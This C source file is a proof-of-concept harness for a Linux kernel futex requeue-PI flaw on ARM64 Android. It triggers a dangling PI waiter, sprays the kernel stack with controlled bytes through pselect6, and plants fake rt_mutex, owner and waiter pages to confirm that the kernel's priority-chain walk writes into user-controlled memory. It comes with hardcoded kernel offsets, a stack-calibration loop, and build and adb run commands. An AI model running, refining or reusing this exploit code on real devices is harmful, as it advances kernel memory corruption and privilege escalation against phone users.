/*
 * ghostlock_chain.c — GhostLock chainwalk validation harness (phase mode).
 *
 * One trial per execution, one question:
 *   does FUTEX_LOCK_PI(f_chain) from a 4th thread read waiter->lock out of
 *   the stamped kernel-stack slot and reach rt_mutex_adjust_prio_chain?
 *
 * Graph preserved until consumer: waiter KEEPS f_chain (no FUPI), owner
 * stays blocked on f_chain, pi_state2 stays allocated. No teardown between
 * EDEADLK and consumer.
 *
 * Phases (one line each, flushed, sufficient to reconstruct after crash):
 *   P0 READY            all threads + pages prepared
 *   P1 TRIGGER_ENTER    before CMP_REQUEUE_PI
 *   P2 EDEADLK          CMP returned 35, dangling pi_blocked_on exists
 *   P3 GRAPH_PRESERVED  no teardown done, waiter woken for stamp only
 *   P4 STAMP_DONE       waiter published SPs (or SKIPPED in nostamp mode)
 *   P5 LOCK_PI_ENTER    consumer flag set, syscall next (no log after this
 *                       on consumer thread before svc)
 *   P5b LOCK_PI_DONE   consumer returned (only if no panic inside walk)
 *   P6 RESULT=<...>    fake page dump + verdict
 *
 * Critical path (waiter stamp -> consumer svc) contains: no printf, no
 * malloc/free, no auxiliary futex, no join, no sleep, no pselect/poll on
 * waiter after last stamp, no setschedparam. Main may usleep (own stack
 * is not under test). Waiter<->main handoff uses atomics on plain words,
 * never a futex (a futex would re-enter the stamped stack).
 *
 * Fake variants (argv[2]):
 *   A  lock==NULL (inert). Walk must stop at next_lock==NULL, no chain.
 *   B  lock=&fake zero page + tree_entry=self. Minimal full walk, owner=0
 *      terminates. Expect: trylock RMW at lock+0x00, dequeue bails,
 *      writes to waiter+0x40/+0x48, enqueue writes waiter ptr to
 *      lock+0x08/+0x10, then owner==0 returns.
 *   C  B + fake owner = second controlled page (observe refcount inc at
 *      owner+0x28 without touching real task).
 *   D  C + owner page carries pi_blocked_on at +0x7f0 -> second fake
 *      waiter (tests recursion read at 0x...4ff0/0x...4ff8).
 *
 * PREEMPT modes (argv[3]):
 *   immediate  stamp -> consumer at once (shortest window)
 *   busy       stamp -> userland busy loop -> consumer (clobber probe)
 *   nostamp    no stamp at all, consumer walks natural stack bytes
 *
 * Stack geometry is solved on device in one boot: waiter records SP of
 * the FWRQ svc, then SP of the pselect svc with the same inline-asm
 * probe; main closes the fixed point. All values printed in P4.
 *
 * Build (NDK r29, ARM64, API 28):
 *   aarch64-linux-android28-clang -O2 -Wall -static ghostlock_chain.c -o ghostlock_chain
 * Run:
 *   adb push ghostlock_chain /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_chain [pad_hex] [A|B|C|D] [immediate|busy|nostamp] [busy_iters]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef __NR_gettid
#define __NR_gettid 178
#endif
#define FUTEX_LOCK_PI          6
#define FUTEX_WAIT_REQUEUE_PI  11
#define FUTEX_CMP_REQUEUE_PI   12
#define FUTEX_WAKE             1
#define FUTEX_PRIVATE_FLAG     128
#define EDEADLK                35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FWAKE (FUTEX_WAKE | FUTEX_PRIVATE_FLAG)

/* from build-aq/vmlinux: 0x70 + 0x120 + 0x1a0 frame chain, waiter at x29+0x80 */
#define WAITER_OFF_SP   0x2b0
#define LAB_PAD        0x120
#define FD_OFF         0x190
#define WIN_SLOTS      6
#define PSEL_SIZE      40
#define WIN_LEN        (WIN_SLOTS * PSEL_SIZE)
#define PSEL_NFDS      320

#define RTMW_LOCK      0x38
#define RTMW_PRIO      0x40
#define RTMW_TREE      0x00

#define LOCK_WAIT_LOCK 0x00
#define LOCK_WAITERS   0x08
#define LOCK_LEFTMOST  0x10
#define LOCK_OWNER     0x18

#define OWNER_USAGE_OFF 0x28
#define OWNER_PIBLOCKED 0x7f0

static uint32_t f_wait, f_target, f_chain;
static volatile int w_armed, o_started, cmp_done, consumer_in;
static volatile int consumer_entered, consumer_done;
static volatile long consumer_rc;
static volatile int consumer_errno;
static volatile uint64_t g_pad = LAB_PAD;

static unsigned char win[WIN_LEN] __attribute__((aligned(64)));
static void *fake;
static void *fake_owner;             /* VAR C/D only */
static void *fake_waiter2;           /* VAR D only: 2nd waiter for recursion */
static uint64_t *fake8;
static uint64_t *fake_owner8;
static uint64_t sp_psel;
static volatile uint64_t sp_futex;
static volatile uint64_t sp_pub;
static volatile int g_pub, g_turn, g_stop;
static volatile int w_back;

static int g_var = 'B';              /* A|B|C|D */
static int g_mode = 0;               /* 0=immediate 1=busy 2=nostamp */
static volatile uint64_t g_busy = 200000;
static int g_pin = 0;

static void pin_cpu0(void) {
    cpu_set_t m;
    CPU_ZERO(&m);
    CPU_SET(0, &m);
    sched_setaffinity(0, sizeof(m), &m);
}

/* raw syscall, no glibc frame between the asm SP adjust and the svc.
 * bionic's syscall() stub is `mov x8,#nr; svc #0` and pushes nothing, so the
 * SP we record here is the SP the kernel sees. */
static long raw_psel(void *rinp, void *routp, void *rexp, uint64_t pad) {
    struct timespec ts = { 0, 0 };
    long r;

    __asm__ volatile("sub sp, sp, %[pad]\n\t"
                     "mov %[out], sp\n\t"
                     : [out] "=r"(sp_psel)
                     : [pad] "r"(pad)
                     : "memory");
    r = syscall(SYS_pselect6, (long)PSEL_NFDS, rinp, routp, rexp, &ts, 0);
    __asm__ volatile("add sp, sp, %[pad]" :: [pad] "r"(pad) : "memory");
    return r;
}

static long xfutex(void *u, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u, op, val, to, u2, v3);
}

/* sp_futex is the calibration anchor, so only the waiter's WAIT_REQUEUE_PI is
 * allowed to set it. The owner and the consumer call plain xfutex(). */
__attribute__((noinline)) static long xfutex_fwrq(void *u, int op, uint32_t val,
                                                  void *to, void *u2,
                                                  uint32_t v3) {
    long r;

    __asm__ volatile("mov %[out], sp" : [out] "=r"(sp_futex) :: "memory");
    r = xfutex(u, op, val, to, u2, v3);
    return r;
}

/* Fill win[] per VAR. Called on waiter before each pselect so the bytes the
 * kernel copies are always the current variant. In nostamp mode it is still
 * called once so win[] contents are defined for the report. */
static void fill_win(void) {
    memset(win, 0, sizeof(win));
    *(uint64_t *)&win[RTMW_TREE + 0x00] = (uint64_t)(uintptr_t)win;
    *(uint64_t *)&win[RTMW_TREE + 0x08] = (uint64_t)(uintptr_t)win;
    *(uint64_t *)&win[RTMW_TREE + 0x10] = (uint64_t)(uintptr_t)win;
    if (g_var == 'A') {
        *(uint64_t *)&win[RTMW_LOCK] = 0;
    } else {
        *(uint64_t *)&win[RTMW_LOCK] = (uint64_t)(uintptr_t)fake;
    }
    *(uint32_t *)&win[RTMW_PRIO] = 1; /* != 120, FULL ignores match anyway */
}

static void *waiter_fn(void *u) {
    struct timespec ts;
    (void)u;

    if (g_pin)
        pin_cpu0();
    if (xfutex(&f_chain, FLPI, 0, 0, 0, 0))
        return 0;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 30;
    w_armed = 1;
    __asm__ volatile("" ::: "memory");
    xfutex_fwrq(&f_wait, FWRQ, 0, &ts, &f_target, 0);

    /* Rollback done. Below is stamp only, then park. No FUPI, no sleep. */
    while (!cmp_done)
        __asm__ volatile("" ::: "memory");

    if (g_mode == 2) {
        /* nostamp: touch nothing, park immediately. Natural stack bytes
         * are whatever the FWRQ frame left behind. */
        fill_win(); /* define win[] for report only, no syscall */
        w_back = 1;
        __atomic_store_n(&g_pub, 1, __ATOMIC_RELEASE);
        for (;;)
            __asm__ volatile("" ::: "memory");
    }

    for (;;) {
        uint64_t pad = g_pad;
        int my_turn = __atomic_load_n(&g_turn, __ATOMIC_ACQUIRE);

        fill_win();
        raw_psel(win, win + PSEL_SIZE, win + 2 * PSEL_SIZE, pad);
        sp_pub = sp_psel;
        __atomic_store_n(&g_pub, 1, __ATOMIC_RELEASE);
        while (__atomic_load_n(&g_turn, __ATOMIC_ACQUIRE) == my_turn)
            __asm__ volatile("yield" ::: "memory");
        if (__atomic_load_n(&g_stop, __ATOMIC_ACQUIRE))
            break;
        __atomic_store_n(&g_pub, 0, __ATOMIC_RELEASE);
    }
    w_back = 1;

    for (;;)
        __asm__ volatile("" ::: "memory");
}

static void *owner_fn(void *u) {
    (void)u;
    if (g_pin)
        pin_cpu0();
    if (xfutex(&f_target, FLPI, 0, 0, 0, 0))
        return 0;
    while (!w_armed)
        __asm__ volatile("" ::: "memory");
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, 0, 0, 0);
    return 0;
}

static void *consumer_fn(void *u) {
    long r;
    (void)u;
    if (g_pin)
        pin_cpu0();
    while (!consumer_in)
        __asm__ volatile("" ::: "memory");
    /* Flag BEFORE the svc so main can print P5 even if we never return. */
    __atomic_store_n(&consumer_entered, 1, __ATOMIC_RELEASE);
    __asm__ volatile("" ::: "memory");
    errno = 0;
    r = xfutex(&f_chain, FLPI, 0, 0, 0, 0);
    consumer_errno = errno;
    consumer_rc = r;
    __atomic_store_n(&consumer_done, 1, __ATOMIC_RELEASE);
    return 0;
}

static void setup_fake(void) {
    /* fake: played as rt_mutex. mlock so it never faults. */
    memset(fake, 0, 4096);
    fake8 = fake;
    /* wait_lock=0: trylock must succeed. waiters/leftmost=0: empty tree.
     * owner per VAR. */
    if (g_var == 'A') {
        /* lock word unused; keep zero for report clarity */
    } else if (g_var == 'B') {
        fake8[LOCK_OWNER / 8] = 0; /* terminator: walk returns 0 */
    } else if (g_var == 'C' || g_var == 'D') {
        memset(fake_owner, 0, 4096);
        fake_owner8 = fake_owner;
        fake8[LOCK_OWNER / 8] = (uint64_t)(uintptr_t)fake_owner;
        /* owner+0x28 refcount starts 0 -> inc observable */
        if (g_var == 'D') {
            memset(fake_waiter2, 0, 4096);
            *(uint64_t *)((char *)fake_waiter2 + RTMW_LOCK) =
                (uint64_t)(uintptr_t)fake;
            *(uint32_t *)((char *)fake_waiter2 + RTMW_PRIO) = 1;
            *(uint64_t *)((char *)fake_owner + OWNER_PIBLOCKED) =
                (uint64_t)(uintptr_t)fake_waiter2;
        }
    }
}

int main(int argc, char **argv) {
    pthread_t w, o, c;
    int spins, attempt;

    setbuf(stdout, 0);
    if (argc > 1)
        g_pad = strtoull(argv[1], 0, 0);
    if (argc > 2)
        g_var = argv[2][0];
    if (argc > 3) {
        if (!strcmp(argv[3], "busy"))
            g_mode = 1;
        else if (!strcmp(argv[3], "nostamp"))
            g_mode = 2;
        else
            g_mode = 0;
    }
    if (argc > 4)
        g_busy = strtoull(argv[4], 0, 0);
    if (argc > 5 && !strcmp(argv[5], "pin"))
        g_pin = 1;
    if (g_var != 'A' && g_var != 'B' && g_var != 'C' && g_var != 'D')
        g_var = 'B';

    fake = mmap(0, 4096, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fake == MAP_FAILED) {
        printf("P0 ABORT mmap fake failed\n");
        return 3;
    }
    mlock(fake, 4096);
    if (g_var == 'C' || g_var == 'D') {
        fake_owner = mmap(0, 4096, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_owner == MAP_FAILED) {
            printf("P0 ABORT mmap owner failed\n");
            return 3;
        }
        mlock(fake_owner, 4096);
    }
    if (g_var == 'D') {
        fake_waiter2 = mmap(0, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_waiter2 == MAP_FAILED) {
            printf("P0 ABORT mmap waiter2 failed\n");
            return 3;
        }
        mlock(fake_waiter2, 4096);
    }
    memset(win, 0, sizeof(win));
    setup_fake();

    printf("P0 READY var=%c mode=%s pad=0x%llx fake=%p owner=%p waiter2=%p win=%p\n",
           g_var, g_mode == 0 ? "immediate" : g_mode == 1 ? "busy" : "nostamp",
           (unsigned long long)g_pad, fake, fake_owner, fake_waiter2, win);
    printf("P0 fake: +0x08=%#llx +0x10=%#llx +0x18=%#llx\n",
           (unsigned long long)fake8[LOCK_WAITERS / 8],
           (unsigned long long)fake8[LOCK_LEFTMOST / 8],
           (unsigned long long)fake8[LOCK_OWNER / 8]);

    if (pthread_create(&w, 0, waiter_fn, 0) ||
        pthread_create(&o, 0, owner_fn, 0) ||
        pthread_create(&c, 0, consumer_fn, 0)) {
        printf("P0 ABORT pthread_create failed\n");
        return 3;
    }

    spins = 0;
    while ((!w_armed || !o_started) && spins++ < 3000)
        usleep(10000);
    if (!w_armed || !o_started) {
        printf("P0 ABORT trio did not arm\n");
        return 2;
    }
    usleep(300000);

    printf("P1 TRIGGER_ENTER cmp_requeue_pi f_wait->f_target\n");
    errno = 0;
    xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
    printf("P2 EDEADLK errno=%d (%s)%s\n", errno, strerror(errno),
           errno == EDEADLK ? "" : " NOT_THE_TRIGGER");
    if (errno != EDEADLK)
        return 2;

    /* Preserve graph: no FUPI(f_chain), no unlock, no join. Wake waiter
     * so it returns from FWRQ and stamps. */
    cmp_done = 1;
    xfutex(&f_wait, FWAKE, 1, 0, 0, 0);
    printf("P3 GRAPH_PRESERVED no_teardown waiter_keeps_f_chain owner_blocked\n");

    if (g_mode == 2) {
        spins = 0;
        while (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE) && spins++ < 3000)
            usleep(10000);
        printf("P4 STAMP_SKIPPED nostamp natural_bytes_only sp_futex=%#llx waiter_est=%#llx page_off=%#llx\n",
               (unsigned long long)sp_futex,
               (unsigned long long)(sp_futex - WAITER_OFF_SP),
               (unsigned long long)((sp_futex - WAITER_OFF_SP) & 0x3fff));
    } else {
        for (attempt = 0; attempt < 4; attempt++) {
            uint64_t pad, fix;

            spins = 0;
            while (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE) && spins++ < 3000)
                usleep(10000);
            if (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE)) {
                printf("P4 ABORT waiter never published SP\n");
                __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
                __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
                return 2;
            }
            pad = g_pad;
            fix = pad + sp_futex - sp_pub + (uint64_t)(FD_OFF - WAITER_OFF_SP);
            printf("P4 CAL attempt=%d pad=%#llx sp_futex=%#llx sp_psel=%#llx implied_pad=%#llx waiter_est=%#llx page_off=%#llx dist=%#llx\n",
                   attempt, (unsigned long long)pad,
                   (unsigned long long)sp_futex, (unsigned long long)sp_pub,
                   (unsigned long long)fix,
                   (unsigned long long)(sp_futex - WAITER_OFF_SP),
                   (unsigned long long)((sp_futex - WAITER_OFF_SP) & 0x3fff),
                   (unsigned long long)(sp_futex > sp_pub ? sp_futex - sp_pub : sp_pub - sp_futex));
            if (fix == pad) {
                __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
                __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
                break;
            }
            g_pad = fix;
            __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
        }
        if (!__atomic_load_n(&g_stop, __ATOMIC_ACQUIRE)) {
            printf("P4 ABORT no fixed point in 4 attempts\n");
            __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
            __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
            return 2;
        }
        printf("P4 STAMP_DONE pad=%#llx task_off=+0x30 lock=+0x38 prio=+0x40 win=%p fake=%p\n",
               (unsigned long long)g_pad, (void *)&win[0], fake);
    }

    spins = 0;
    while (!w_back && spins++ < 3000)
        usleep(10000);
    if (!w_back) {
        printf("P4 ABORT waiter did not park\n");
        return 2;
    }
    /* Re-apply VAR after calibration stamps so the final window holds the
     * variant bytes, not calibration pattern. Waiter is parked (no syscall)
     * so its stack is untouched from here on. */
    setup_fake();
    /* win[] is user memory: rewrite is safe, kernel already copied it. */
    fill_win();
    printf("P4 FINAL var=%c fake_before +0x08=%#llx +0x10=%#llx +0x18=%#llx waiter_prio=%u\n",
           g_var,
           (unsigned long long)fake8[LOCK_WAITERS / 8],
           (unsigned long long)fake8[LOCK_LEFTMOST / 8],
           (unsigned long long)fake8[LOCK_OWNER / 8],
           *(uint32_t *)&win[RTMW_PRIO]);

    if (g_mode == 1) {
        volatile uint64_t k = 0;
        uint64_t n = g_busy;
        printf("P4 BUSY spin=%llu\n", (unsigned long long)n);
        for (uint64_t i = 0; i < n; i++)
            k += i;
        __asm__ volatile("" :: "r"(k) : "memory");
    }

    /* Consumer: single FUTEX_LOCK_PI, prepared long ago. */
    consumer_in = 1;
    printf("P5 LOCK_PI_ENTER var=%c mode=%s\n", g_var,
           g_mode == 0 ? "immediate" : g_mode == 1 ? "busy" : "nostamp");

    spins = 0;
    while (!__atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE) && spins++ < 300)
        usleep(10000);
    /* Give the syscall time to walk. Poll user-owned words only. */
    for (spins = 0; spins < 300; spins++) {
        if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
            break;
        if (fake8[LOCK_WAITERS / 8] || fake8[LOCK_LEFTMOST / 8])
            break;
        usleep(10000);
    }
    /* Drain a bit more so a slow walk can finish its stores. */
    usleep(200000);

    if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
        printf("P5 LOCK_PI_DONE rc=%ld errno=%d\n", consumer_rc, consumer_errno);
    else
        printf("P5 LOCK_PI_PENDING entered=%d (no return yet: spinning in walk or blocked)\n",
               __atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE));

    {
        uint64_t w08 = fake8[LOCK_WAITERS / 8];
        uint64_t l10 = fake8[LOCK_LEFTMOST / 8];
        uint64_t ow = fake8[LOCK_OWNER / 8];
        const char *v;
        if (l10 && l10 == (uint64_t)(uintptr_t)win)
            v = "HIT_ENQUEUE";
        else if (l10 || w08)
            v = "HIT_OTHER_WRITE";
        else if (!__atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE))
            v = "MISS_NO_ENTER";
        else if (!__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
            v = "HANG_IN_WALK";
        else
            v = "MISS_RETURNED_NOWRITE";
        printf("P6 RESULT=%s var=%c pad=0x%llx waiters=%#llx leftmost=%#llx owner=%#llx entered=%d done=%d\n",
               v, g_var, (unsigned long long)g_pad,
               (unsigned long long)w08, (unsigned long long)l10,
               (unsigned long long)ow,
               __atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE),
               __atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE));
        if (g_var == 'C' || g_var == 'D')
            printf("P6 OWNER_PAGE +0x28=%#llx +0x7f0=%#llx\n",
                   (unsigned long long)fake_owner8[OWNER_USAGE_OFF / 8],
                   (unsigned long long)*(uint64_t *)((char *)fake_owner + OWNER_PIBLOCKED));
        printf("P6 HINT HIT_ENQUEUE leftmost==&win means rt_mutex_enqueue ran on our page.\n");
        /* exit code 0 only on exact enqueue hit */
        return (l10 == (uint64_t)(uintptr_t)win) ? 0 : 1;
    }
}
